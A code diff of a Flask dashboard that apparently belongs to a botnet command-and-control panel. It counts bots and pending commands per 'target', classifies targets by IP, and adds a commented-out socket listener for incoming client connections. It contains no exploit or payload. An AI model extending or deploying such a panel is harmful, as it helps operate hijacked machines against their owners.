@@ -15,18 +15,33 @@ import traceback
 import bcrypt
 from flask import render_template, url_for, Blueprint, request, session, flash, redirect, jsonify
 from sqlalchemy.orm import sessionmaker
-from urllib.parse import unquote
+# from urllib.parse import unquote
+# import socket
+# import threading
 
-from db.modle import Users, APICommand, APILink, Targets, Instraction, ApiToken, Instruction_Detail, BotNet
+from db.modle import Targets, ApiToken, BotNet, APICommand
 from db.mange_db import config, _create_engine
-from utility.email_temp import EmailTemplate
+# from utility.email_temp import EmailTemplate
 from utility.processer import log, getlist, readFromJson, delete_data
+# from utility.socket_utility import get_ip, handle_client
 
 
 Session = sessionmaker(bind=_create_engine())
 _session = Session()
 
 view = Blueprint("view", __name__, template_folder="templates")
+# SOCK_CLINENT = []
+# # socket server
+# def socket_server_manger(port: int)->None:
+#     server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+#     host = get_ip()
+#     server.bind((host,port))
+#     server.listen(5)
+#     while True:
+#         client, addr = server.accept()
+#         log(f'[SOCKET] : new connection from {addr}')
+#         SOCK_CLINENT.append(client)
+#         threading.Thread(target=handle_client, args=(client,)).start()
 
 
 @view.route("/dashboard")
@@ -40,14 +55,17 @@ def dashboard():
         try:
             email = session['email']
             print(email)
+            pending_command = len(_session.query(APICommand).filter_by(email=session['email'], condition=config.STUTAS[1]).all())
             targets = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(), sp=',')
             botnet_per_targert = {}
             _targets = [] #list of (target_info, conn_type, target_name)
+            total_bot = 0
             for target in targets:
                 target_ = readFromJson('target-info',target[1])
                 print(target_)
                 botnet_info = _session.query(BotNet).filter_by(target_name=target[1]).all()
                 botnet_per_targert[target[1]] = (len(botnet_info), botnet_info)
+                total_bot = total_bot + len(botnet_info)
                 if '127.0.0.1' in target_['ip']:
                     conn = 'local'
                 elif '192.168' in target_['ip']:
@@ -56,10 +74,10 @@ def dashboard():
                     # , mdi mdi-ethernet-cable
                     conn = 'ethernet'
                 _targets.append((target_, conn, target[1]))
-
+            botnet_per_targert['totalBot'] = total_bot
             if request.method != 'GET':
                 return redirect(url_for('event.page_404'))
-            return render_template('auth/dashboard.html', targets=_targets,botnet_per_targert=botnet_per_targert)
+            return render_template('auth/dashboard.html', targets=_targets,botnet_per_targert=botnet_per_targert,pending_commands=pending_command)
         except Exception as e:
             log(f'[ERROR ROUT] : {request.endpoint} error: {e}\n{traceback.format_exc()}')
             print(traceback.format_exc())
@@ -76,6 +94,7 @@ def dashboard():
     
 # -------------------------------------------------------------------------------
 
+# -----------------------------------socket--------------------------------------------
 @view.route("/socket/<target_name>")
 def socket_page(target_name):
     """
@@ -100,6 +119,7 @@ def socket_page(target_name):
     else:
         flash("you must login first")
         return redirect(url_for("public.login"))
+# ---------------------------------------------------------------------------------------
 
 
 # -----------------------------------botNet management-----------------------------------
